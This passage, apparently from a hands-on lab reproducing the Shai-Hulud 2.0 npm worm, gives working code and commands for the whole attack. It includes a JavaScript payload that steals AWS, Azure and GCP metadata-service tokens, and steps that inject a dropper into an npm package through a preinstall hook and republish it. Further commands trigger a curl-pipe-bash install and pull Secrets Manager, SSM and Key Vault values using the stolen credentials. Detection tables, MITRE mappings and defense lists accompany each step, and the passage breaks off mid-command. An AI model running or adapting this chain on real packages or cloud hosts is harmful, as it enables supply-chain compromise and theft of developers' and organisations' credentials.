    fs.writeFileSync(path.join(EXFIL_DIR, "aws_imds.json"), JSON.stringify({
      role: roleName,
      AccessKeyId: creds.AccessKeyId,
      Expiration: creds.Expiration,
      note: "SecretAccessKey and Token also captured (truncated for safety)"
    }, null, 2));
    return creds;
  } catch (e) {
    log("  [-] AWS IMDS not reachable: " + e.message);
    return null;
  }
}

// ---- PHASE 2D: AZURE IMDS ----
async function harvestAzure() {
  log("Phase 2D: Azure IMDS Managed Identity token theft...");
  try {
    var resp = await httpGet(
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net",
      { "Metadata": "true" }
    );
    if (resp.status !== 200) throw new Error("Azure IMDS returned " + resp.status);

    var data = JSON.parse(resp.body);
    log("  [+] Token type:  " + data.token_type);
    log("  [+] Resource:    " + data.resource);
    log("  [+] Expires on:  " + data.expires_on);
    log("  [+] Token:       " + data.access_token.substring(0, 20) + "...");

    fs.writeFileSync(path.join(EXFIL_DIR, "azure_imds.json"), JSON.stringify({
      token_type: data.token_type,
      resource: data.resource,
      expires_on: data.expires_on,
      token_preview: data.access_token.substring(0, 30) + "..."
    }, null, 2));
    return data.access_token;
  } catch (e) {
    log("  [-] Azure IMDS not reachable: " + e.message);
    return null;
  }
}

// ---- PHASE 2E: GCP METADATA ----
async function harvestGCP() {
  log("Phase 2E: GCP metadata server token theft...");
  try {
    var resp = await httpGet(
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      { "Metadata-Flavor": "Google" }
    );
    if (resp.status !== 200) throw new Error("GCP metadata returned " + resp.status);

    var data = JSON.parse(resp.body);
    log("  [+] Token type:  " + data.token_type);
    log("  [+] Expires in:  " + data.expires_in + "s");

    var emailResp = await httpGet(
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
      { "Metadata-Flavor": "Google" }
    );
    log("  [+] SA email:    " + emailResp.body);

    fs.writeFileSync(path.join(EXFIL_DIR, "gcp_metadata.json"), JSON.stringify({
      token_type: data.token_type,
      expires_in: data.expires_in,
      service_account: emailResp.body,
      token_preview: data.access_token.substring(0, 20) + "..."
    }, null, 2));
    return data.access_token;
  } catch (e) {
    log("  [-] GCP metadata not reachable: " + e.message);
    return null;
  }
}

// ---- MAIN ----
async function main() {
  console.log("");
  console.log("========================================");
  console.log(" Shai-Hulud 2.0 -- Lab Payload");
  console.log("  Runtime: " + (process.env.PAYLOAD_RUNTIME || "node"));
  console.log("  Host:    " + os.hostname());
  console.log("  User:    " + os.userInfo().username);
  console.log("  OS:      " + os.platform() + " " + os.arch());
  console.log("  Time:    " + new Date().toISOString());
  console.log("========================================");

  var localFindings = scanLocal();
  console.log("");
  runTruffleHog(localFindings.git_repos);
  console.log("");
  await harvestAWS();
  console.log("");
  await harvestAzure();
  console.log("");
  await harvestGCP();

  console.log("");
  console.log("========================================");
  console.log(" Results: " + EXFIL_DIR);
  console.log("========================================");
  console.log("");
}

main().catch(console.error);
PAYLOAD_EOF

echo "bun_environment.js created ($(wc -l < bun_environment.js) lines)"
```

### Step 8: Inject the Payload into @novatech/auth-helpers and Publish

#### Commands

```bash
echo "=== STEP 8: Injecting payload into @novatech/auth-helpers ==="
cd ~/shai-hulud-lab

# Step 8a: Download the current package from Verdaccio
mkdir -p inject-workspace && cd inject-workspace
npm pack @novatech/auth-helpers --registry http://localhost:4873 2>/dev/null
```

**What `npm pack` does:**
- Fetches the package tarball from the registry (same as `npm install` but saves the `.tgz` file instead of extracting to `node_modules`)
- The tarball contains `package.json`, `index.js`, and any other files in the package

```bash
# Step 8b: Extract the tarball
tar xzf novatech-auth-helpers-*.tgz
cd package

# Step 8c: Inject the malicious files
cp ~/shai-hulud-lab/payload/setup_bun.js .
cp ~/shai-hulud-lab/payload/bun_environment.js .

# Step 8d: Modify package.json to add the preinstall hook and bump version
python3 -c "
import json

with open('package.json', 'r') as f:
    pkg = json.load(f)

# Add the preinstall hook -- this is the trigger for the entire attack
pkg['scripts'] = pkg.get('scripts', {})
pkg['scripts']['preinstall'] = 'node setup_bun.js'

# Bump the patch version (2.4.1 -> 2.4.2)
# This makes it look like a routine update
version_parts = pkg['version'].split('.')
version_parts[2] = str(int(version_parts[2]) + 1)
pkg['version'] = '.'.join(version_parts)

with open('package.json', 'w') as f:
    json.dump(pkg, f, indent=2)

print(f'Injected preinstall hook. Version: {pkg[\"version\"]}')
"

# Step 8e: Verify the infection
echo ""
echo "--- Infected package.json ---"
cat package.json | python3 -m json.tool
echo ""
echo "--- Files in package ---"
ls -la
```

**Expected output:**
```json
{
  "name": "@novatech/auth-helpers",
  "version": "2.4.2",
  "scripts": {
    "preinstall": "node setup_bun.js"
  },
  ...
}
```

The package now contains three files: `index.js` (original), `setup_bun.js` (dropper), `bun_environment.js` (payload).

```bash
# Step 8f: Publish the backdoored version to Verdaccio
npm publish --registry http://localhost:4873

echo ""
echo "--- Verification: check the live version ---"
curl -s "http://localhost:4873/-/v1/search?text=@novatech/auth-helpers" | \
  jq '.objects[0].package | {name, version}'
```

**Expected output:**
```json
{
  "name": "@novatech/auth-helpers",
  "version": "2.4.2"
}
```

```bash
# Clean up the workspace
cd ~/shai-hulud-lab && rm -rf inject-workspace
```

#### What Just Happened

You performed the exact injection sequence of Shai-Hulud 2.0:

1. **Downloaded** the original package tarball from the registry (`npm pack`)
2. **Extracted** it and injected two files: `setup_bun.js` (dropper) and `bun_environment.js` (payload)
3. **Modified** `package.json` to add `"preinstall": "node setup_bun.js"`
4. **Bumped** the patch version (2.4.1 -> 2.4.2) to look like a normal update
5. **Republished** using the stolen npm token

**The infection is live.** Anyone who now runs `npm install @novatech/auth-helpers` (or any package that depends on it) will:
1. Resolve `@novatech/auth-helpers@^2.4.0` to version `2.4.2` (semver: `^` allows patch updates)
2. Download the infected tarball
3. Execute `node setup_bun.js` before installation completes
4. The dropper installs Bun and launches the credential harvester

In the real attack, the worm automated this process for up to 100 packages per victim, running in parallel. At peak, 1,000 new exfiltration repositories appeared every 30 minutes.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Supply Chain: Software Supply Chain | **T1195.002** | Initial Access |
| Event Triggered Execution | **T1546** | Persistence, Privilege Escalation |
| Masquerading: Match Legitimate Name | **T1036.005** | Defense Evasion |

T1546 applies because the `preinstall` hook is a form of event-triggered execution -- the malicious code runs automatically in response to an `npm install` event, without any user interaction.

T1036.005 applies because `setup_bun.js` disguises itself as a legitimate Bun development environment setup script.

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **SCA** | Package version updated with new `preinstall` script | **Critical** |
| **ASPM** | Package published from IP address outside normal CI/CD range | **Critical** |
| **CWP** | `npm install` spawns unexpected child process (`bun`) | **High** |
| **SCA** | Package contains files not present in previous version (`setup_bun.js`, `bun_environment.js`) | **High** |

**What the SOC would see:** "Package `@novatech/auth-helpers` version 2.4.2 published from IP 203.0.113.x. Previous version (2.4.1) had no lifecycle scripts. New version adds `preinstall` hook executing `node setup_bun.js`. File `bun_environment.js` (10MB) added -- not present in previous version."

#### Defense

1. **Use `--ignore-scripts`** in `.npmrc`: `echo "ignore-scripts=true" >> ~/.npmrc`
2. **Pin exact versions** in `package.json` (use `2.4.1` not `^2.4.1`)
3. **Use `npm audit signatures`** to verify package provenance
4. **Enable npm provenance** on your packages to cryptographically link them to CI/CD builds
5. **Use Socket.dev** to detect suspicious lifecycle script additions in dependencies
6. **Use `package-lock.json` with `npm ci`** (installs exact versions, fails on mismatch)
7. **Scan packages with `npm audit`** before deploying to production

#### Real-World Examples

- **Shai-Hulud 2.0 (November 2025)**: Exact technique. 796 packages infected with `preinstall` hooks running `node setup_bun.js`. The Bun-based payload was 10MB of obfuscated JavaScript.
- **event-stream (2018)**: Attacker injected malicious code into a `postinstall` script that targeted Bitcoin wallet applications
- **ua-parser-js (2021)**: Compromised package used `preinstall` to download and execute a cryptominer
- **colors.js / faker.js (2022)**: Maintainer used `postinstall` to deploy a destructive infinite loop as protest

---

## PHASE 2: Trigger the Payload + TruffleHog Credential Scanning

### Step 9: Trigger the Infected Package on Your Workstation

#### Context (Attacker Mindset)

The infected package is live on Verdaccio. Now you simulate what happens when a NovaTech developer runs `npm install` in their project. The preinstall hook fires automatically, the dropper installs Bun, and the credential harvester scans the local filesystem.

#### Commands

```bash
echo "=== STEP 9: Triggering the infected package ==="

# Create a simulated victim project
mkdir -p ~/shai-hulud-lab/victim-project
cd ~/shai-hulud-lab/victim-project

cat > package.json << 'EOF'
{
  "name": "novatech-api-service",
  "version": "1.0.0",
  "description": "NovaTech API service (simulated victim project)",
  "dependencies": {
    "@novatech/auth-helpers": "^2.4.0"
  }
}
EOF

# Set the exfiltration directory for the payload
export WORM_EXFIL_DIR="${HOME}/.shai-hulud-exfil"

# Install the package -- THIS TRIGGERS THE PREINSTALL HOOK
echo ""
echo "--- Running npm install (this triggers the payload) ---"
npm install --registry http://localhost:4873 2>&1
```

**Expected output:** You will see normal npm output interleaved with the payload output:

```
[setup_bun] Initializing development environment...
[setup_bun] Installing Bun runtime...
[setup_bun] Bun installed successfully: /home/you/.bun/bin/bun
[setup_bun] Launching background process...
[setup_bun] Environment configured.
```

The payload runs in the background. Wait a few seconds for it to complete:

```bash
sleep 10

# Check what the payload harvested
echo ""
echo "--- Payload results ---"
ls -la ~/.shai-hulud-exfil/
echo ""
echo "--- Local credentials discovered ---"
cat ~/.shai-hulud-exfil/local_credentials.json 2>/dev/null | python3 -m json.tool || echo "Payload still running..."
```

```bash
# Verify that Bun was actually installed by the dropper
echo ""
echo "--- Bun installation check ---"
if [ -f "${HOME}/.bun/bin/bun" ]; then
  echo "Bun was installed by the dropper:"
  ${HOME}/.bun/bin/bun --version
  echo ""
  echo "In process list, the payload appears as 'bun' not 'node':"
  ps aux | grep -E "bun|setup_bun" | grep -v grep || echo "(background process already exited)"
else
  echo "Bun installation was skipped (may have used Node.js fallback)"
fi
```

#### What Just Happened

When you ran `npm install`:

1. npm resolved `@novatech/auth-helpers@^2.4.0` to version `2.4.2` (the infected version, because `^2.4.0` allows any version `>=2.4.0 <3.0.0`)
2. npm downloaded the tarball from Verdaccio
3. **Before extracting files**, npm executed the `preinstall` script: `node setup_bun.js`
4. The dropper checked if Bun was installed. It was not, so it ran `curl -fsSL https://bun.sh/install | bash`
5. Bun was installed to `~/.bun/bin/bun`
6. The dropper launched `bun run bun_environment.js` as a **detached background process**
7. The parent process (`setup_bun.js`) exited, and npm continued with the normal installation
8. In the background, the payload scanned `.npmrc`, `.env`, `.ssh/`, `.aws/credentials`, etc.

**The key insight:** The entire payload delivery happened invisibly during a routine `npm install`. The developer saw normal npm output. No errors, no warnings. The Bun process ran silently in the background.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Credentials in Files | **T1552.001** | Credential Access |
| System Information Discovery | **T1082** | Discovery |
| Masquerading | **T1036.004** | Defense Evasion |

T1036.004 (Masquerade as Legitimate Application) applies because `setup_bun.js` disguises itself as a development environment setup, and Bun is a legitimate tool being abused.

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CWP** | `npm install` spawns `curl` to download external binary (Bun) | **High** |
| **CWP** | New `bun` process reading credential files (.npmrc, .env, .ssh/) | **Critical** |
| **CWP** | Process accessing multiple credential file paths in rapid succession | **High** |

**What the SOC would see:** "Process `bun` (PID 12345, spawned by `npm install`) accessed `/home/developer/.npmrc`, `/home/developer/.env`, and `/home/developer/.ssh/id_ed25519` within 2 seconds. Process was launched by `setup_bun.js` executed via npm preinstall hook."

#### Defense

1. **`npm install --ignore-scripts`** prevents all lifecycle hooks
2. **Monitor for `curl | bash` patterns** in build environments (strong IOC)
3. **Endpoint Detection and Response (EDR)** should alert on unexpected binary downloads during package installation
4. **Sandbox npm installs** in containers with no access to host credentials

---

### Step 10: Run TruffleHog on the AWS VM (from Inside)

#### Context (Attacker Mindset)

You have harvested local credentials on your workstation. But the real prize is on the cloud VMs, where IMDS provides temporary cloud credentials and the developer's home directory may contain additional secrets. You SSH into each VM, copy the payload, and run it -- experiencing the full credential harvesting chain from inside the cloud environment.

We start with AWS because it has the most permissive IMDS configuration (IMDSv1).

#### Concept: TruffleHog

**TruffleHog** (https://github.com/trufflesecurity/trufflehog) is an open-source secret scanner maintained by Truffle Security. It detects **800+ types of credentials** including:

- AWS access keys (pattern: `AKIA[0-9A-Z]{16}`)
- GitHub Personal Access Tokens (pattern: `ghp_[A-Za-z0-9]{36}`)
- Stripe API keys (pattern: `sk_live_[A-Za-z0-9]{24}`)
- Database connection strings, JWT secrets, OAuth tokens, and hundreds more

What makes TruffleHog especially powerful (and dangerous when weaponized): it scans **git history**. Even if a developer committed credentials and then deleted them in a subsequent commit, TruffleHog finds the credential in the old commit. The `git show HEAD~1:filename` command reveals what was in the file before the "fix."

The Shai-Hulud 2.0 worm downloaded TruffleHog to `~/.truffler-cache/extract/` and ran it against the entire home directory. Results were collected into `truffleSecrets.json`.

#### Commands

```bash
echo "=== STEP 10: SSH into AWS EC2 + Run TruffleHog + Steal IMDS Credentials ==="

# SSH into the EC2 instance
ssh -i ~/shai-hulud-lab/terraform/lab-key.pem \
  -o StrictHostKeyChecking=no \
  ec2-user@$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw aws_instance_public_ip)
```

**Flag breakdown for SSH:**
- `-i lab-key.pem` -- Use the private key generated by Terraform for authentication
- `-o StrictHostKeyChecking=no` -- Do not prompt to verify the host key (lab convenience only)
- `ec2-user@...` -- The default username for Amazon Linux AMIs is `ec2-user`

**You are now inside the EC2 instance.** Everything from here until `exit` runs on the VM.

```bash
# ---- YOU ARE NOW ON THE EC2 INSTANCE ----

echo "=== Running on $(hostname) ==="
echo ""

# First, check what seeded credentials exist on this VM
echo "--- Seeded credential files ---"
sudo ls -la /home/developer/.env /home/developer/.npmrc /home/developer/.aws/credentials 2>/dev/null
echo ""

echo "--- Contents of .env ---"
sudo cat /home/developer/.env
echo ""

echo "--- Contents of .npmrc ---"
sudo cat /home/developer/.npmrc
echo ""

# Check the git repo that has "deleted" credentials in its history
echo "--- Git repo with secrets in history ---"
sudo -u developer bash -c 'cd /home/developer/projects/internal-api && git log --oneline && echo "" && cat config.py && echo "" && git show HEAD~1:config.py'
echo ""
echo "TruffleHog will find these 'deleted' credentials."
```

```bash
# Install TruffleHog on the VM (same as the real worm)
echo ""
echo "--- Installing TruffleHog ---"
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | \
  sudo sh -s -- -b /usr/local/bin
trufflehog --version

# Run TruffleHog against the git repo
echo ""
echo "--- TruffleHog scanning git history ---"
sudo -u developer trufflehog git file:///home/developer/projects/internal-api --json --no-update --no-verification 2>/dev/null | \
  python3 -c "
import sys, json
for line in sys.stdin:
    line = line.strip()
    if not line or line[0] != '{':
        continue
    try:
        finding = json.loads(line)
        det = finding.get('SourceMetadata', {}).get('Data', {}).get('Git', {})
        print(f'  FOUND: {finding.get(\"DetectorName\", \"unknown\")}')
        print(f'    File:   {det.get(\"file\", \"unknown\")}')
        print(f'    Commit: {det.get(\"commit\", \"unknown\")[:12]}...')
        print(f'    Email:  {det.get(\"email\", \"unknown\")}')
        print()
    except:
        pass
"
echo "TruffleHog found credentials that were 'deleted' from the code but remain in git history!"
```

**Expected output:** TruffleHog finds the AWS access key and the database password that were committed in the first commit and "removed" in the second. The git history preserves them forever.

#### What Just Happened

TruffleHog scanned every commit in the git repository's history. It found:

1. **AWS access key** (`AKIAIOSFODNN7SIMULATED`) in `config.py` at commit `HEAD~1`
2. **AWS secret access key** in the same file
3. **Database password** (`NovaTech-Prod-DB-P@ssw0rd-2025!`) in the same commit

Even though the developer "deleted" these credentials in the next commit, they remain in the git object database forever (unless the repository is rewritten with `git filter-branch` or BFG Repo-Cleaner). This is why TruffleHog is so effective -- it finds what file-level scanners miss.

In the real Shai-Hulud 2.0 worm, TruffleHog results were written to `truffleSecrets.json`, triple-Base64-encoded, and uploaded to the exfiltration GitHub repository.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Automated Collection | **T1119** | Collection |
| Credentials in Files | **T1552.001** | Credential Access |

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CWP** | TruffleHog binary downloaded and executed on workload | **High** |
| **CWP** | Process recursively scanning git repositories for credentials | **High** |

#### Defense

1. **Use `git-secrets`** to prevent credentials from being committed in the first place
2. **Run TruffleHog in CI/CD** (offensively, before attackers do) to find exposed secrets
3. **Use BFG Repo-Cleaner** to purge accidentally committed secrets from git history
4. **Rotate all exposed credentials immediately** -- deleting the file is not enough

---

### Step 11: AWS IMDS Credential Theft (from Inside the EC2 Instance)

**You should still be SSH'd into the EC2 instance from Step 10.** If not, SSH back in.

#### Concept: AWS Instance Metadata Service (IMDS)

The **Instance Metadata Service** is an HTTP endpoint at `http://169.254.169.254` available to every EC2 instance. It provides:

- Instance identity (ID, type, AMI, region)
- Network configuration (public/private IP, MAC address)
- **IAM role temporary credentials** (the critical target)

There are two versions:

**IMDSv1** (the vulnerable version):
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
A simple GET request returns the role name. A second GET returns the credentials. No authentication, no session token, no headers required. Any process on the instance can do this.

**IMDSv2** (the secure version):
```
# Step 1: Get a session token (PUT request with hop limit)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use the token for all subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

IMDSv2 prevents credential theft via SSRF attacks because the PUT request (Step 1) cannot be made through most HTTP redirect/proxy chains. Setting `http_tokens = "required"` in the Terraform EC2 configuration forces IMDSv2.

#### Commands

```bash
# ---- STILL ON THE EC2 INSTANCE ----

echo "=== AWS IMDS Credential Theft ==="
echo ""

# Step 11a: Query IMDS for the IAM role name
# This is a simple HTTP GET to a link-local address (169.254.169.254)
# No authentication, no headers, no session token required (IMDSv1)
echo "--- Querying IMDS for IAM role name ---"
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "IAM Role: ${ROLE_NAME}"
```

**What `169.254.169.254` is:** A link-local address only reachable from within the EC2 instance. It is not a real server -- the hypervisor intercepts the request and responds with instance metadata. Think of it as a virtual HTTP API served by the cloud provider's infrastructure layer.

```bash
# Step 11b: Get the temporary credentials for this role
echo ""
echo "--- Stealing temporary credentials ---"
CREDS_JSON=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME})
echo "${CREDS_JSON}" | python3 -m json.tool
```

**Expected output:**
```json
{
    "Code": "Success",
    "LastUpdated": "2026-03-12T...",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...(40 character string)...",
    "Token": "...(very long string, several hundred characters)...",
    "Expiration": "2026-03-12T..."
}
```

**This is the critical moment.** You are holding real, working AWS temporary credentials. The `AccessKeyId` starts with `ASIA` (indicating temporary credentials from STS, as opposed to `AKIA` for long-lived IAM user keys). These credentials are valid for approximately 6 hours.

```bash
# Step 11c: Export the stolen credentials as environment variables
# This is exactly what the worm does -- it sets these as env vars
# and then uses the AWS SDK to make API calls
echo ""
echo "--- Configuring stolen credentials ---"
export AWS_ACCESS_KEY_ID=$(echo "${CREDS_JSON}" | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo "${CREDS_JSON}" | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo "${CREDS_JSON}" | python3 -c "import sys,json; print(json.load(sys.stdin)['Token'])")

# Step 11d: Verify identity with the stolen credentials
echo ""
echo "--- Verifying stolen identity ---"
aws sts get-caller-identity
```

**Expected output:**
```json
{
    "UserId": "AROA...:i-0abc123...",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/sh2-xxxx-ec2-role/i-0abc..."
}
```

The ARN tells you: this identity is an EC2 instance (`i-0abc...`) that has assumed the role `sh2-xxxx-ec2-role`. You now operate as this role.

```bash
# Step 11e: Enumerate Secrets Manager
echo ""
echo "--- Enumerating Secrets Manager secrets ---"
aws secretsmanager list-secrets \
  --query 'SecretList[].{Name:Name,Description:Description}' \
  --output table
```

**Flag breakdown:**
- `list-secrets` -- Lists all secrets the caller can access
- `--query 'SecretList[].{Name:Name,Description:Description}'` -- JMESPath query selecting name and description
- `--output table` -- Format as readable table

```bash
# Step 11f: Exfiltrate each secret value
echo ""
echo "--- Exfiltrating secret values ---"
for secret_name in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do
  echo ""
  echo "  >>> Stealing: ${secret_name}"
  aws secretsmanager get-secret-value \
    --secret-id "${secret_name}" \
    --query 'SecretString' \
    --output text
done
```

**Expected output:** The actual content of each secret:
- Database credentials (username, password, host, port)
- Stripe API key
- OAuth client secret

```bash
# Step 11g: Enumerate and exfiltrate SSM Parameter Store
echo ""
echo "--- Enumerating SSM Parameter Store ---"
aws ssm describe-parameters \
  --query 'Parameters[].{Name:Name,Type:Type,Description:Description}' \
  --output table

echo ""
echo "--- Exfiltrating SSM parameter values ---"
for param_name in $(aws ssm describe-parameters --query 'Parameters[].Name' --output text); do
  echo ""
  echo "  >>> Stealing: ${param_name}"
  aws ssm get-parameter \
    --name "${param_name}" \
    --with-decryption \
    --query 'Parameter.Value' \
    --output text
done
```

**Flag breakdown for `get-parameter`:**
- `--name` -- The parameter name (full path, e.g., `/sh2-xxxx/prod/app/jwt-secret`)
- `--with-decryption` -- Decrypt SecureString parameters using KMS. Without this flag, SecureString values are returned as encrypted blobs.
- `--query 'Parameter.Value'` -- Extract just the value

```bash
# Step 11h: The worm would also scan multiple AWS regions
# In production, it iterated across 17 regions:
echo ""
echo "--- Cross-region enumeration (simulated) ---"
echo "In the real worm, it would now call ListSecrets in these regions:"
echo "  us-east-1, us-east-2, us-west-1, us-west-2"
echo "  eu-west-1, eu-west-2, eu-central-1"
echo "  ap-southeast-1, ap-southeast-2, ap-northeast-1"
echo "  ca-central-1, sa-east-1, ap-south-1"
echo "  eu-north-1, me-south-1, af-south-1, ap-east-1"
echo ""
echo "Each call uses the SAME stolen credentials (they work across regions)."
echo "This is why Resource: '*' without region conditions is so dangerous."

# Done with AWS -- exit the EC2 instance
echo ""
echo "=== AWS credential theft complete. Exiting EC2 instance. ==="
exit
```

#### What Just Happened

From inside the EC2 instance, you:

1. **Queried IMDS** with a simple `curl` GET request (no auth) to get the IAM role name
2. **Retrieved temporary credentials** (AccessKeyId, SecretAccessKey, Token) via a second GET
3. **Exported credentials** as environment variables (AWS CLI and SDKs automatically use these)
4. **Verified identity** with `sts:GetCallerIdentity` to confirm you are operating as the EC2's role
5. **Enumerated secrets** in Secrets Manager (`ListSecrets`) and SSM (`DescribeParameters`)
6. **Exfiltrated values** using `GetSecretValue` and `GetParameter --with-decryption`

Every one of these API calls is logged in **CloudTrail**. A defender reviewing CloudTrail would see:
- `GetCallerIdentity` from the EC2 instance (normal-ish)
- `ListSecrets` followed by multiple `GetSecretValue` calls (suspicious burst)
- `DescribeParameters` followed by `GetParameter` with decryption (suspicious burst)

The total time: under 30 seconds. In the real Shai-Hulud 2.0 worm, this was automated with the AWS SDK and ran across 17 regions in parallel.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Cloud Instance Metadata API | **T1552.005** | Credential Access |
| Cloud Secrets Management Stores | **T1555.006** | Credential Access |
| Cloud Infrastructure Discovery | **T1580** | Discovery |

T1552.005 specifically names "Instance Metadata Service" and describes adversaries accessing `http://169.254.169.254` to obtain credentials.

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CSPM** | EC2 instance with IMDSv1 enabled (`http_tokens = optional`) | **Critical** |
| **CDR** | Burst of Secrets Manager `GetSecretValue` calls from EC2 role | **Critical** |
| **CDR** | SSM `GetParameter` with `--with-decryption` for multiple params | **High** |
| **CDR** | `ListSecrets` + `GetSecretValue` pattern (enumeration-then-theft) | **Critical** |
| **CIEM** | IAM role has `Resource: "*"` on `secretsmanager:GetSecretValue` | **High** |

**What the SOC would see:** "IAM role `sh2-xxxx-ec2-role` called `secretsmanager:GetSecretValue` 3 times in 5 seconds from instance `i-0abc123`. This role has never accessed Secrets Manager before. Alert: Possible credential theft via IMDS followed by secret exfiltration."

#### Defense

1. **Enforce IMDSv2** on ALL EC2 instances: set `http_tokens = "required"` in launch templates
2. **Set IMDS hop limit to 1**: prevents container escape attacks from reaching IMDS
3. **Scope IAM policies** to specific secret ARNs: `arn:aws:secretsmanager:us-east-1:123456:secret:prod/database/*`
4. **Add VPC conditions**: `"Condition": {"StringEquals": {"aws:SourceVpc": "vpc-123456"}}`
5. **Enable GuardDuty**: detects unusual Secrets Manager/SSM access patterns
6. **Use VPC endpoints** for Secrets Manager (keeps traffic off the public internet)
7. **Monitor CloudTrail** for `GetSecretValue` bursts from instance roles

#### Real-World Examples

- **Shai-Hulud 2.0 (November 2025)**: The worm bundled the AWS SDK and called Secrets Manager across 17 regions using IMDS-stolen credentials. (Wiz noted the cloud.json file was never populated due to a bug, but the code was fully functional.)
- **Capital One (2019)**: SSRF exploit used IMDSv1 to steal IAM role credentials, accessing 100M+ customer records in S3
- **SCARLETEEL (2023)**: Attackers accessed IMDS from compromised containers, stole role credentials, and used them to access S3 and Terraform state files
- **First LLMjacking (Sysdig, 2024)**: Stolen IMDS credentials used to invoke Bedrock models at $46,000/day

---

### Step 12: Azure IMDS Credential Theft (from Inside the VM)

#### Context (Attacker Mindset)

You move to the Azure VM. The approach is similar to AWS -- query the metadata service for credentials -- but Azure uses a different endpoint format, requires a mandatory header, and returns OAuth2 Bearer tokens instead of AWS-style access keys.

#### Concept: Azure Managed Identity

**Managed Identity** is Azure's equivalent of AWS IAM roles for EC2. When a VM has a System-Assigned Managed Identity:

1. Azure automatically creates an identity (service principal) in **Entra ID** (formerly Azure AD)
2. The identity gets an Object ID that can be used in RBAC role assignments and Key Vault access policies
3. Any code on the VM can request an OAuth2 Bearer token from the Azure IMDS

The token request specifies a **resource** (audience), which determines what API the token can access:
- `https://vault.azure.net` -- Key Vault
- `https://management.azure.com` -- Azure Resource Manager
- `https://storage.azure.com` -- Blob Storage
- `https://graph.microsoft.com` -- Microsoft Graph (Entra ID)

Azure IMDS requires the `Metadata: true` HTTP header on all requests. This header prevents some SSRF attacks (the attacker cannot add custom headers through most redirect chains), but it does NOT prevent direct access from code running on the VM.

#### Commands

```bash
echo "=== STEP 12: Azure Managed Identity Token Theft ==="

# Get the vault name before SSH (needed inside the VM)
VAULT_NAME=$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw azure_keyvault_name)
echo "Run this inside the Azure VM:"
echo "  VAULT_NAME=\"${VAULT_NAME}\""

# SSH into the Azure VM, passing VAULT_NAME as an environment variable
sshpass -p 'P@ssw0rd!NovaTech2025Lab' ssh -o StrictHostKeyChecking=no \
  azureuser@$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw azure_vm_public_ip)
# Password: P@ssw0rd!NovaTech2025Lab (automatic with sshpass)
```

**You are now inside the Azure VM.**

```bash
# ---- YOU ARE NOW ON THE AZURE VM ----

echo "=== Running on $(hostname) ==="
echo ""

# Step 12a: Request a Managed Identity token scoped to Key Vault
# The "Metadata: true" header is REQUIRED -- Azure IMDS rejects without it
echo "--- Requesting Managed Identity token ---"
TOKEN_RESPONSE=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net")
```

**Flag breakdown for the Azure IMDS request:**
- `http://169.254.169.254` -- Same link-local IP as AWS (Azure uses it too)
- `/metadata/identity/oauth2/token` -- The token endpoint for Managed Identity
- `api-version=2018-02-01` -- Required API version parameter
- `resource=https%3A%2F%2Fvault.azure.net` -- URL-encoded `https://vault.azure.net` -- the token audience. This token will only work with Key Vault APIs.
- `-H "Metadata: true"` -- **Mandatory header**. Azure IMDS returns 400 without it.

```bash
echo "${TOKEN_RESPONSE}" | python3 -m json.tool 2>/dev/null | head -10
echo ""

# Extract the Bearer token
ACCESS_TOKEN=$(echo "${TOKEN_RESPONSE}" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Token type:     Bearer"
echo "Token length:   ${#ACCESS_TOKEN} characters"
echo "Token preview:  ${ACCESS_TOKEN:0:30}..."
echo "Resource:       https://vault.azure.net"
```

**Expected output:** A JSON response containing `access_token`, `token_type`, `resource`, and `expires_on`. The token is a JWT (JSON Web Token) -- a base64-encoded string with three sections separated by dots.

```bash
# Step 12b: Use the stolen token to list Key Vault secrets via REST API
# This is exactly how the worm accesses Key Vault -- raw HTTP with the Bearer token
# You need to replace VAULT_NAME with your actual Key Vault name.
# Get it from: terraform output azure_keyvault_name (on your workstation)

# Get vault name from terraform output (run on local machine first):
#   terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw azure_keyvault_name
VAULT_NAME="<paste vault name here>"

echo "--- Listing secrets (using Managed Identity token) ---"
curl -s -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  "https://${VAULT_NAME}.vault.azure.net/secrets?api-version=7.4" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for s in data.get('value', []):
    name = s['id'].split('/')[-1]
    print(f'  Secret: {name}')
"

echo "--- Exfiltrating Key Vault secret values ---"
for secret in cosmos-db-connection-string sendgrid-api-key storage-account-key; do
  echo ">>> Stealing: ${secret}"
  curl -s -H "Authorization: Bearer ${ACCESS_TOKEN}" \
